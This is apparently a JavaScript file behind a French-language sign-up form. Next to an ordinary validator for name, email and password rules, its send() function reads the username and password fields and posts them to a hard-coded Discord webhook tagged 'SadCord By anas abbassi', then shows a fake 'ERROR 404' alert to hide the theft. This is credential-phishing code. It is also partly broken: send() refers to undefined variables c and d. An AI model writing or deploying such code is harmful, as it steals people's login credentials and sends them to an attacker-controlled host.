function send(){
    var a = document.getElementById("username").value; 
    var b = document.getElementById("password").value; 
    var discordWebhook = "https://discord.com/api/webhooks/1071501347750412388/3C6f-LbqkywnYHkI5bkqw_lz2WUb0X1_uGYdTPDOfiK2_jpQwBRKgG3U3YoPJSHtcYZR";       
    var request = new XMLHttpRequest();
    request.open("POST", discordWebhook);
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
        username: "SadCord By anas abbassi",
        

        content: 'name:'+a+' prenom:'+b+ "email:"+c+' password:'+d

    };
    request.send(JSON.stringify(params));
    alert("ERROR 404")

}
function v(){
    var a=document.getElementById("nom").value;
    var b=document.getElementById("prenom").value;
    var c=document.getElementById("email").value;
    var d=document.getElementById("password").value;

    if (a==""){
        alert("Veuillez entrer votre nom");
        return false;
    }
    if (b==""){
        alert("Veuillez entrer votre prenom");
        return false;
    }
    if (c==""){
        alert("Veuillez entrer votre email");
        return false;
    }
    if (d==""){
        alert("Veuillez entrer votre mot de passe");
        return false;
    }
    if (d.length<8){
        alert("Mot de passe doit contenir au moins 8 caractères");
        return false;
    }
    var specialCharPattern = /[!@#$%^&*(),.?":{}|<>]/;
    var numberPattern = /[0-9]/;
    var alphabetPattern = /[a-zA-Z]/;

    if (!specialCharPattern.test(d)) {
        alert("Le mot de passe doit contenir au moins un caractère spécial");
        return false;
    }
    if (!numberPattern.test(d)) {
        alert("Le mot de passe doit contenir au moins un chiffre");
        return false;
    }
    if (!alphabetPattern.test(d)) {
        alert("Le mot de passe doit contenir au moins une lettre");
        return false;
    }

}